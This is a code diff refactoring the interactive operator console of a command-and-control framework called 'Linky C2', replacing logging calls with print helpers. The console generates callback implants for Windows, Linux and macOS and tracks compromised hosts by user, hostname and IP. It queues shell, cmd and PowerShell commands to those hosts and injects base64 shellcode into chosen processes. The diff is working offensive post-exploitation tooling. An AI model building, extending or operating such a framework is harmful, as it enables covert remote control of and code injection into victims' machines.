@@ -5,9 +5,10 @@ use uuid::Uuid;
 
 use crate::generate;
 use crate::links::{LinkStatus, Links};
+use crate::ui;
 
 pub fn run(links: Arc<Mutex<Links>>) {
-    tracing::info!("{}", "Linky C2 – type 'help' for commands\n".bold());
+    ui::print_bold("Linky C2 – type 'help' for commands\n");
 
     let mut rl = DefaultEditor::new().expect("readline init failed");
 
@@ -25,42 +26,42 @@ pub fn run(links: Arc<Mutex<Links>>) {
                     "links" => links_menu(&links, &mut rl),
                     "generate" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: generate <ip:port>");
+                            ui::print("Usage: generate <ip:port>");
                         } else {
                             generate::generate_windows(rest);
                         }
                     }
                     "generate-linux" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: generate-linux <ip:port>");
+                            ui::print("Usage: generate-linux <ip:port>");
                         } else {
                             generate::generate_linux(rest);
                         }
                     }
                     "generate-native" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: generate-native <ip:port>");
+                            ui::print("Usage: generate-native <ip:port>");
                         } else {
                             generate::generate_native(rest);
                         }
                     }
                     "generate-osx" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: generate-osx <ip:port>");
+                            ui::print("Usage: generate-osx <ip:port>");
                         } else {
                             generate::generate_osx(rest);
                         }
                     }
                     "help" => print_help(),
                     "exit" | "quit" | "kill" => {
-                        tracing::info!("Exiting.");
+                        ui::print("Exiting.");
                         std::process::exit(0);
                     }
-                    _ => tracing::info!("Unknown command '{}'. Type 'help'.", cmd),
+                    _ => ui::print(&format!("Unknown command '{}'. Type 'help'.", cmd)),
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
-                tracing::info!("\nExiting.");
+                ui::print("\nExiting.");
                 std::process::exit(0);
             }
             Err(e) => tracing::error!("readline error: {}", e),
@@ -71,9 +72,9 @@ pub fn run(links: Arc<Mutex<Links>>) {
 // ── Links submenu ────────────────────────────────────────────────────────────
 
 fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
-    tracing::info!("\n{}", "╔══════════════════════════════╗".cyan().bold());
-    tracing::info!("{}", "║          LINKS MENU          ║".cyan().bold());
-    tracing::info!("{}\n", "╚══════════════════════════════╝".cyan().bold());
+    ui::print_cyan_bold("\n╔══════════════════════════════╗");
+    ui::print_cyan_bold("║          LINKS MENU          ║");
+    ui::print_cyan_bold("╚══════════════════════════════╝\n");
     print_links_table(links);
 
     loop {
@@ -88,45 +89,42 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
 
                 match cmd {
                     "-h" | "help" => {
-                        tracing::info!(
-                            "  {}          Show all links (including inactive)",
-                            "-a".yellow()
-                        );
-                        tracing::info!("  {}   Interact with a link", "-i <name>".yellow());
-                        tracing::info!("  {}   Send kill task + mark exited", "-k <name>".yellow());
-                        tracing::info!("  {}        Return to main menu", "back".yellow());
+                        ui::print(&format!("  {}          Show all links (including inactive)", "-a".yellow()));
+                        ui::print(&format!("  {}   Interact with a link", "-i <name>".yellow()));
+                        ui::print(&format!("  {}   Send kill task + mark exited", "-k <name>".yellow()));
+                        ui::print(&format!("  {}        Return to main menu", "back".yellow()));
                     }
                     "-a" => print_links_table(links),
                     "-i" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: -i <name>");
+                            ui::print("Usage: -i <name>");
                         } else if let Some(id) = resolve_link(links, rest) {
                             interact(links, id, rl);
                         } else {
-                            tracing::info!("{} Link not found: {}", "[-]".red(), rest);
+                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                         }
                     }
                     "-k" => {
                         if rest.is_empty() {
-                            tracing::info!("Usage: -k <name>");
+                            ui::print("Usage: -k <name>");
                         } else if let Some(id) = resolve_link(links, rest) {
                             let mut l = links.lock().unwrap();
                             l.add_task(id, "exit".into(), "kill".into());
                             l.kill_link(id);
-                            tracing::info!("{} Kill task queued.", "[+]".green());
+                            ui::print(&format!("{} Kill task queued.", "[+]".green()));
                         } else {
-                            tracing::info!("{} Link not found: {}", "[-]".red(), rest);
+                            ui::print(&format!("{} Link not found: {}", "[-]".red(), rest));
                         }
                     }
                     "back" | "exit" | "q" => break,
                     "generate" | "generate-linux" | "generate-native" | "links" | "kill"
                     | "quit" => {
-                        tracing::info!(
+                        ui::print(&format!(
                             "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                             cmd
-                        );
+                        ));
                     }
-                    _ => tracing::info!("Unknown command '{}'. Type -h for help.", cmd),
+                    _ => ui::print(&format!("Unknown command '{}'. Type -h for help.", cmd)),
                 }
             }
             Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
@@ -139,10 +137,10 @@ fn print_links_table(links: &Arc<Mutex<Links>>) {
     let links = links.lock().unwrap();
     let all = links.all_links();
     if all.is_empty() {
-        tracing::info!("{} No links registered.", "[*]".cyan());
+        ui::print(&format!("{} No links registered.", "[*]".cyan()));
         return;
     }
-    tracing::info!(
+    ui::print(&format!(
         "\n{}",
         format!(
             "{:<12} {:<24} {:<18} {:<12} {:<10}",
@@ -150,18 +148,18 @@ fn print_links_table(links: &Arc<Mutex<Links>>) {
         )
         .cyan()
         .bold()
-    );
-    tracing::info!("{}", "─".repeat(78).cyan());
+    ));
+    ui::print(&format!("{}", "─".repeat(78).cyan()));
     for l in all {
         let status = status_colored(&l.status);
-        tracing::info!(
+        ui::print(&format!(
             "{:<12} {:<24} {:<18} {:<12} {}",
             l.name,
             format!("{}@{}", l.username, l.hostname),
             l.internal_ip,
             l.platform,
             status,
-        );
+        ));
     }
 }
 
@@ -171,15 +169,15 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
     {
         let l = links.lock().unwrap();
         if let Some(link) = l.get_link(link_id) {
-            tracing::info!(
+            ui::print(&format!(
                 "\n{} Interacting with {} – {}@{} [{}]",
                 "[*]".cyan(),
                 link.name.bold(),
                 link.username,
                 link.hostname,
                 link.platform.yellow()
-            );
-            tracing::info!("    Type 'help' for commands, 'back' to return\n");
+            ));
+            ui::print("    Type 'help' for commands, 'back' to return\n");
         }
     }
 
@@ -208,14 +206,14 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                         let mut l = links.lock().unwrap();
                         l.add_task(link_id, "exit".into(), "kill".into());
                         l.kill_link(link_id);
-                        tracing::info!("{} Kill task queued.", "[+]".green());
+                        ui::print(&format!("{} Kill task queued.", "[+]".green()));
                         break;
                     }
 
                     // ── Shell execution helpers ──────────────────────────
                     "cmd" => {
                         if !is_windows(links, link_id) {
-                            tracing::info!("{} 'cmd' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!("{} 'cmd' is a Windows-only command.", "[-]".red()));
                         } else {
                             queue(links, link_id, format!("cmd /C {}", args), line.clone());
                         }
@@ -223,10 +221,10 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     "shell" => queue(links, link_id, line.clone(), line.clone()),
                     "powershell" | "ps" => {
                         if !is_windows(links, link_id) {
-                            tracing::info!(
+                            ui::print(&format!(
                                 "{} 'powershell' is a Windows-only command.",
                                 "[-]".red()
-                            );
+                            ));
                         } else {
                             queue(
                                 links,
@@ -243,10 +241,10 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     }
                     "integrity" => {
                         if !is_windows(links, link_id) {
-                            tracing::info!(
+                            ui::print(&format!(
                                 "{} 'integrity' is a Windows-only command.",
                                 "[-]".red()
-                            );
+                            ));
                         } else {
                             queue(links, link_id, line.clone(), line.clone());
                         }
@@ -255,7 +253,7 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                     // ── Process injection ───────────────────────────────
                     "inject" => {
                         if !is_windows(links, link_id) {
-                            tracing::info!("{} 'inject' is a Windows-only command.", "[-]".red());
+                            ui::print(&format!("{} 'inject' is a Windows-only command.", "[-]".red()));
                         } else {
                             queue(links, link_id, line.clone(), line.clone());
                         }
@@ -274,25 +272,25 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
 fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
     let l = links.lock().unwrap();
     if let Some(link) = l.get_link(link_id) {
-        tracing::info!("  Name      : {}", link.name);
-        tracing::info!("  ID        : {}", link.id);
-        tracing::info!("  User      : {}@{}", link.username, link.hostname);
-        tracing::info!("  Internal  : {}", link.internal_ip);
-        tracing::info!("  Platform  : {}", link.platform);
-        tracing::info!("  PID       : {}", link.pid);
-        tracing::info!(
+        ui::print(&format!("  Name      : {}", link.name));
+        ui::print(&format!("  ID        : {}", link.id));
+        ui::print(&format!("  User      : {}@{}", link.username, link.hostname));
+        ui::print(&format!("  Internal  : {}", link.internal_ip));
+        ui::print(&format!("  Platform  : {}", link.platform));
+        ui::print(&format!("  PID       : {}", link.pid));
+        ui::print(&format!(
             "  First seen: {}",
             link.first_checkin.format("%Y-%m-%d %H:%M:%S")
-        );
-        tracing::info!(
+        ));
+        ui::print(&format!(
             "  Last seen : {}",
             link.last_checkin.format("%Y-%m-%d %H:%M:%S")
-        );
-        tracing::info!(
+        ));
+        ui::print(&format!(
             "  {}    : {}",
             "Status".cyan(),
             status_colored(&link.status)
-        );
+        ));
     }
 }
 
@@ -333,29 +331,29 @@ fn split_first(s: &str) -> (&str, &str) {
 }
 
 fn print_help() {
-    tracing::info!("  links                    Manage active links");
-    tracing::info!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
-    tracing::info!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
-    tracing::info!(
+    ui::print("  links                    Manage active links");
+    ui::print("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
+    ui::print("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
+    ui::print(
         "  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)"
     );
-    tracing::info!("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
-    tracing::info!("  help                     Show this help");
-    tracing::info!("  exit / kill              Quit linky");
+    ui::print("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
+    ui::print("  help                     Show this help");
+    ui::print("  exit / kill              Quit linky");
 }
 
 fn print_link_help() {
-    tracing::info!("  cmd <args>          Execute via cmd.exe /C <args>");
-    tracing::info!("  shell <cmd>         Send raw command string");
-    tracing::info!("  powershell <args>   Execute via powershell.exe");
-    tracing::info!("  ls [path]           List directory");
-    tracing::info!("  cd <path>           Change directory");
-    tracing::info!("  pwd                 Print working directory");
-    tracing::info!("  whoami              Current user (domain\\user)");
-    tracing::info!("  pid                 Process ID");
-    tracing::info!("  integrity           Token integrity level");
-    tracing::info!("  inject <pid> <b64>  Inject base64 shellcode into PID");
-    tracing::info!("  info                Show link metadata");
-    tracing::info!("  kill                Send exit + mark link dead");
-    tracing::info!("  back                Return to links menu");
+    ui::print("  cmd <args>          Execute via cmd.exe /C <args>");
+    ui::print("  shell <cmd>         Send raw command string");
+    ui::print("  powershell <args>   Execute via powershell.exe");
+    ui::print("  ls [path]           List directory");
+    ui::print("  cd <path>           Change directory");
+    ui::print("  pwd                 Print working directory");
+    ui::print("  whoami              Current user (domain\\user)");
+    ui::print("  pid                 Process ID");
+    ui::print("  integrity           Token integrity level");
+    ui::print("  inject <pid> <b64>  Inject base64 shellcode into PID");
+    ui::print("  info                Show link metadata");
+    ui::print("  kill                Send exit + mark link dead");
+    ui::print("  back                Return to links menu");
 }
